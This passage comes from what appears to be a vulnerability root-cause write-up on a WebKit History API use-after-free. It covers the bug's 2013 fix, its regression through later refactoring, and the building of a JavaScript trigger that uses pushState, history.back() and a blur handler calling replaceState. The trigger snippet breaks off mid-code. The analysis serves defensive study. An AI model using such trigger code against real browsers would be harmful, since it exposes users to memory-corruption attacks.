 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The use-after-free from 2013 (</span><span>no CVE was assigned</span><span>) </span><span>was</span><span>&nbsp;a bug in the implementation of the History API. This API allows access to (and modification of) a stack of the pages visited in the current frame, and these page states are stored as a </span><span class="ZslSztaQWN-c4">SerializedScriptValue</span><span>. The History API exposes a getter for </span><span class="ZslSztaQWN-c4">state</span><span>, and a method </span><span class="ZslSztaQWN-c4">replaceState</span><span>&nbsp;which allows overwriting the &quot;most recent&quot; history entry. <br><br>The bug was that in the implementation of the getter for </span><span class="ZslSztaQWN-c4">state</span><span>, </span><span class="ZslSztaQWN-c4">SerializedScriptValue::deserialize</span><span>&nbsp;was called on the current &quot;most recent&quot; history entry value without increasing its reference count. As </span><span class="ZslSztaQWN-c4">SerializedScriptValue::deserialize</span><span>&nbsp;could trigger a callback into user JavaScript, the callback could call </span><span class="ZslSztaQWN-c4">replaceState</span><span>&nbsp;to drop the only reference to the history entry value by replacing it with a new value. When the callback returned, the rest of </span><span class="ZslSztaQWN-c4">SerializedScriptValue::deserialize</span><span>&nbsp;ran with a free&#39;d </span><span class="ZslSztaQWN-c4">this</span><span>&nbsp;pointer.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>In order to fix this bug, it appears that the developers decided to change every caller of </span><span class="ZslSztaQWN-c4">SerializedScriptValue::deserialize</span><span>&nbsp;to increase the reference count </span><span>on the</span><span>&nbsp;</span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;</span><span>by changing the argument types from a raw pointer to </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span><span>. &nbsp;While the originally reported trigger called </span><span class="ZslSztaQWN-c4">deserialize</span><span>&nbsp;on the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;through the </span><span class="ZslSztaQWN-c4">V8History::stateAccessorGetter</span><span>&nbsp;function, the developers&rsquo; fix also caught and patched the path to </span><span class="ZslSztaQWN-c4">deserialize</span><span>&nbsp;through </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The timeline of the changes impacting the </span><span class="ZslSztaQWN-c4">stateObject</span><span class="ZslSztaQWN-c5">&nbsp;is:</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
<ul class="c22 lst-kix_vnkr79j0brd5-0 start"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/e544495d282d4726fcb491e0e441ddba338b5ec1">December 2009 - state object History API added.</a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">HistoryItem.m_stateObject</span><span>&nbsp;is type </span><span class="ZslSztaQWN-c4">RefPtr&lt;SerializedScriptValue&gt;</span></li><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">HistoryItem::stateObject()</span><span>&nbsp;returns </span><span class="ZslSztaQWN-c4">SerializedScriptValue*</span></li><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;takes </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;argument as </span><span class="ZslSztaQWN-c4">SerializedScriptValue*</span></li></ul>
<ul class="c22 lst-kix_vnkr79j0brd5-0"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/4b3be1d3a8d22cb2b2f5ddb8299f7cd25a21cebf">January 2013 - Patching Sergei&rsquo;s bug</a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">HistoryItem::stateObject</span><span>&nbsp;returns a </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span></li><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;takes </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;argument as </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span></li></ul>
<ul class="c22 lst-kix_vnkr79j0brd5-0"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/ec83a53b569f6c2b493e9874a498cd1b683656a1">September 2015- Deprecating use of PassRefPtr in history directory</a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">HistoryItem::stateObject</span><span>&nbsp;returns </span><span class="ZslSztaQWN-c4">RefPtr</span><span>&nbsp;instead of </span><span class="ZslSztaQWN-c4">PassRefPtr</span></li></ul>
<ul class="c22 lst-kix_vnkr79j0brd5-0"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/ed43edee9f8f114c3b2db3c0420e23f926a968ee">October 2016 - (Potentially) ad-hoc refactoring </a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">HistoryItem::stateObject()</span><span>&nbsp;is changed to return raw pointer instead of </span><span class="ZslSztaQWN-c4">RefPtr</span></li></ul>
<ul class="c22 lst-kix_vnkr79j0brd5-0"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e">December 2016 - CVE-2022-22600 introduced</a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;changed to take </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;as a raw pointer instead of </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span></li></ul>
<ul class="c22 lst-kix_vnkr79j0brd5-0"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/486816dc355c19f1de1b8056f85d0bbf7084dd6e">January 2022 - CVE-2022-22600 patched</a></span></li></ul><ul class="c22 lst-kix_vnkr79j0brd5-1 start" style="margin-left: 23pt;"><li class="c12 c19 c26 li-bullet-0"><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;changed to take </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;as a </span><span class="ZslSztaQWN-c4">RefPtr&lt;SerializedScriptValue&gt;</span></li></ul>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p><h1 class="ZslSztaQWN-c19 ZslSztaQWN-c31" id="h.av2i567ev8fi"><span>The Autopsy</span></h1>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>When we look at the timeline of changes for </span><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;it seems that the bug was re-introduced in December 2016 due to refactoring. The question is, why did the patch author think that </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;would not need to hold a reference. From the </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e">December 2016 commit ChangeLog</a></span><span>: </span><span class="ZslSztaQWN-c4">Take a raw pointer for the serialized script value state object. </span><span class="ZslSztaQWN-c4">No one was passing ownership.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>My assessment is that it&rsquo;s due to the October 2016 changes in </span><span class="ZslSztaQWN-c4">HistoryItem:stateObject</span><span>. When the author was evaluating the refactoring changes needed in the </span><span class="ZslSztaQWN-c4">dom</span><span>&nbsp;directory in December 2016, it would have appeared that the only calls to </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;passed in either a </span><span class="ZslSztaQWN-c4">null</span><span>&nbsp;value or the result of </span><span class="ZslSztaQWN-c4">stateObject()</span><span>&nbsp;which as of October 2016 now passed a raw </span><span class="ZslSztaQWN-c4">SerializedScriptValue*</span><span>&nbsp;pointer. When looking at those two options for the type of an argument, then it&rsquo;s potentially understandable that the developer thought that </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;did not need to share ownership of </span><span class="ZslSztaQWN-c4">stateObject</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>So why then was </span><span class="ZslSztaQWN-c4">HistoryItem::stateObject</span><span>&rsquo;s return value changed from a </span><span class="ZslSztaQWN-c4">RefPtr</span><span class="ZslSztaQWN-c5">&nbsp;to a raw pointer in October 2016? That I&rsquo;m struggling to find an explanation for. </span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>According to the description, the patch in October 2016 was intended to &ldquo;Replace all uses of ExceptionCodeWithMessage with WebCore::Exception&rdquo;. However when we look at the ChangeLog it seems that the author decided to also do some (seemingly unrelated) refactoring to </span><span class="ZslSztaQWN-c4">HistoryItem</span><span>. These are some of the only changes in the commit whose descriptions aren&rsquo;t related to exceptions. As an outsider looking at the commits, it seems that the developer by chance thought they&rsquo;d do a little &ldquo;clean-up&rdquo; while working through the required refactoring on the exceptions. If this was simply an additional ad-hoc step while in the code, rather than the goal of the commit, it seems plausible that the developer and reviewers may not have further traced the full lifetime of </span><span class="ZslSztaQWN-c4">HistoryItem::stateObject</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>While the change to </span><span class="ZslSztaQWN-c4">HistoryItem</span><span>&nbsp;in October 2016 was not sufficient to introduce the bug, it seems that that change likely contributed to the developer in December 2016 thinking that </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;didn&rsquo;t need to increase the reference count on the </span><span class="ZslSztaQWN-c4">stateObject</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Both the October 2016 and the December 2016 commits were very large. The commit in October changed 40 files with 900 additions and 1225 deletions. The commit in December changed 95 files with 1336 additions and 1325 deletions. It seems untenable for any developers or reviewers to understand the security implications of each change in those commits in detail</span><span class="ZslSztaQWN-c5">, especially since they&rsquo;re related to lifetime semantics.</span></p><h1 class="ZslSztaQWN-c31 ZslSztaQWN-c19" id="h.wnkfqwd2smy6"><span>The Zombie</span></h1>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>We&rsquo;ve now tracked down the evolution of changes to fix the 2013 vulnerability&hellip;and then revert those fixes&hellip; so I got back to identifying the 2022 bug. It&rsquo;s the same bug, but triggered through a different path. T</span><span class="ZslSztaQWN-c5">hat&rsquo;s why the 2013 test case wasn&rsquo;t crashing the version of WebKit that should have been vulnerable to CVE-2022-22620:</span></p><ol class="c22 lst-kix_rpn0sahs9m0k-0 start" start="1"><li class="c12 c19 c23 li-bullet-0"><span>The 2013 test case triggers the bug through the </span><span class="ZslSztaQWN-c4">V8History::stateAccessorAndGetter</span><span>&nbsp;path instead of </span><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span class="ZslSztaQWN-c5">, and</span></li><li class="c12 c19 c23 li-bullet-0"><span>As a part of Sergei&rsquo;s 2013 bug report there were additional hardening measures put into place that prevented user-code callbacks being processed during deserialization.</span><span class="ZslSztaQWN-c5">&nbsp;</span></li></ol>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Therefore we needed to figure out how to call </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;and instead of using the deserialization to trigger a JavaScript callback, we needed to find another event in the </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span class="ZslSztaQWN-c5">&nbsp;function that would trigger the callback to user JavaScript.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>To quickly figure out how to call </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>, I modified the WebKit source code to trigger a test failure if </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;was ever called and then ran all the tests in the </span><span class="ZslSztaQWN-c4">fast/history</span><span>&nbsp;d</span><span>irectory. There were 5 out of the 80 tests that called </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span class="ZslSztaQWN-c5">:</span></p><ul class="c22 lst-kix_3vloefecb731-0 start"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/multiple-back-forward-navigations.html">fast/history/multiple-back-forward-navigations.html</a></span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/history-traversal-is-asynchronous.html">fast/history/history-traversal-is-asynchronous.html</a></span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/history-back-forward-within-subframe-hash.html">fast/history/history-back-forward-within-subframe-hash.html</a></span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/link-inside-any.html">fast/history/link-inside-any.html</a></span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/timed-refresh-in-cached-frame.html">fast/history/timed-refresh-in-cached-frame.html</a></span></li></ul>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The tests </span><span class="ZslSztaQWN-c4">history-back-forward-within-subframe-hash.html</span><span>&nbsp;and </span><span class="ZslSztaQWN-c4">fast/history/history-traversal-is-asynchronous.html</span><span>&nbsp;were the most helpful. We can trigger the call to </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;by setting the history stack with an object whose location is the same page, but includes a hash. We then call </span><span class="ZslSztaQWN-c4">history.back()</span><span>&nbsp;to go back to that state that includes the URL with the hash. </span><span class="ZslSztaQWN-c4">loadInSamePage</span><span class="ZslSztaQWN-c5">&nbsp;is responsible for scrolling to that location.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p><a id="t.6c73d82779de9619168336c5e74c9282d03e1118"></a><a id="t.2"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c15"><td class="ZslSztaQWN-c10" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">pushState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;state1&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;location </span><span class="ZslSztaQWN-c2">+</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;#foo&quot;</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">pushState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;state2&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">);</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c32">// current state</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c20"><span class="ZslSztaQWN-c0 ZslSztaQWN-c6"></span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">back</span><span class="ZslSztaQWN-c2">();</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c32">//goes back to state1, triggering loadInSameDocument</span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>&nbsp;</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Now that I knew how to call </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>, I teamed up with Sergei to identify how we could get user code execution sometime during the </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;function, but prior to the call to </span><span class="ZslSztaQWN-c4">statePopped</span><span>&nbsp;</span><span>(</span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blob/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1158">FrameLoader.cpp#1158</a></span><span class="ZslSztaQWN-c5">):</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p><a id="t.44cc163a06cabebe835e9730a761749f62c29f76"></a><a id="t.3"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c15"><td class="ZslSztaQWN-c10" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">m_frame</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">document</span><span class="ZslSztaQWN-c2">()-&gt;</span><span class="ZslSztaQWN-c0">statePopped</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c0">stateObject </span><span class="ZslSztaQWN-c2">?</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c1">Ref</span><span class="ZslSztaQWN-c2">&lt;</span><span class="ZslSztaQWN-c1">SerializedScriptValue</span><span class="ZslSztaQWN-c2">&gt;</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">{</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">*</span><span class="ZslSztaQWN-c0">stateObject </span><span class="ZslSztaQWN-c2">}</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">:</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c1">SerializedScriptValue</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0">nullValue</span><span class="ZslSztaQWN-c2">());</span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The callback to user code would have to occur prior to the call to </span><span class="ZslSztaQWN-c4">statePopped</span><span>&nbsp;because </span><span class="ZslSztaQWN-c4">stateObject</span><span class="ZslSztaQWN-c5">&nbsp;was cast to a reference there and thus would now be reference-counted. We assumed that this would be the place where the &ldquo;freed&rdquo; object was &ldquo;used&rdquo;.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>If you go down the rabbit hole of the calls made in </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>, we find that there is a path to the </span><span class="ZslSztaQWN-c4">blur</span><span>&nbsp;event being dispatched. We could have also used a tool like </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://codeql.github.com/">CodeQL</a></span><span>&nbsp;to see if there was a path from </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;to </span><span class="ZslSztaQWN-c4">dispatchEvent</span><span>, but in this case we just used manual auditing. The call tree to the </span><span class="ZslSztaQWN-c4">blur</span><span class="ZslSztaQWN-c5">&nbsp;event is:</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p><a id="t.870849a2bc6536879e2f5ddf1089bb7c44ea4edb"></a><a id="t.4"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c15"><td class="ZslSztaQWN-c10" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c1">FrameLoader</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">loadInSameDocument</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; </span><span class="ZslSztaQWN-c1">FrameLoader</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">scrollToFragmentWithParentBoundary</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; </span><span class="ZslSztaQWN-c1">FrameView</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">scrollToFragment</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; </span><span class="ZslSztaQWN-c1">FrameView</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">scrollToFragmentInternal</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ZslSztaQWN-c1">FocusController</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">setFocusedElement</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ZslSztaQWN-c1">FocusController</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0 ZslSztaQWN-c6">setFocusedFrame</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dispatchWindowEvent</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c1">Event</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c0">create</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c0">eventNames</span><span class="ZslSztaQWN-c2">().</span><span class="ZslSztaQWN-c0">blurEvent</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c1">Event</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c1">CanBubble</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c1">No</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c1">Event</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c1">IsCancelable</span><span class="ZslSztaQWN-c2">::</span><span class="ZslSztaQWN-c1">No</span><span class="ZslSztaQWN-c2">));</span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The </span><span class="ZslSztaQWN-c4">blur</span><span>&nbsp;event fires on an element whenever focus is moved from that element to another element. In our case </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;is triggered when we need to scroll to a new location within the current page. If we&rsquo;re scrolling and therefore changing focus to a new element, the </span><span class="ZslSztaQWN-c4">blur</span><span class="ZslSztaQWN-c5">&nbsp;event is fired on the element that previously had the focus. </span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The last piece for our trigger is to free the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;in the </span><span class="ZslSztaQWN-c4">onblur</span><span>&nbsp;event handler. To do that we call </span><span class="ZslSztaQWN-c4">replaceState</span><span>, which overwrites the current history state with a new object. This causes the final reference to be dropped on the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;and it&rsquo;s therefore free&rsquo;</span><span>d</span><span>. </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span>&nbsp;still uses the free&rsquo;d </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;in its call to </span><span class="ZslSztaQWN-c4">statePopped</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p><a id="t.b75e8b9268f5881526cd63ea2dc82bafaef64a9f"></a><a id="t.5"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c15"><td class="ZslSztaQWN-c10" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">input </span><span class="ZslSztaQWN-c2">=</span><span class="ZslSztaQWN-c0">&nbsp;document</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">body</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">appendChild</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c0">document</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">createElement</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;input&quot;</span><span class="ZslSztaQWN-c2">));</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c20"><span class="ZslSztaQWN-c0 ZslSztaQWN-c6"></span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">a </span><span class="ZslSztaQWN-c2">=</span><span class="ZslSztaQWN-c0">&nbsp;document</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">body</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">appendChild</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c0">document</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">createElement</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;a&quot;</span><span class="ZslSztaQWN-c2">));</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">a</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">id </span><span class="ZslSztaQWN-c2">=</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;foo&quot;</span><span class="ZslSztaQWN-c2">;</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c20"><span class="ZslSztaQWN-c0 ZslSztaQWN-c6"></span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">pushState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;state1&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;location </span><span class="ZslSztaQWN-c2">+</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;#foo&quot;</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">pushState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;state2&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c20"><span class="ZslSztaQWN-c0 ZslSztaQWN-c6"></span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">setTimeout</span><span class="ZslSztaQWN-c2">(()</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">=&gt;</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">{</span></p>
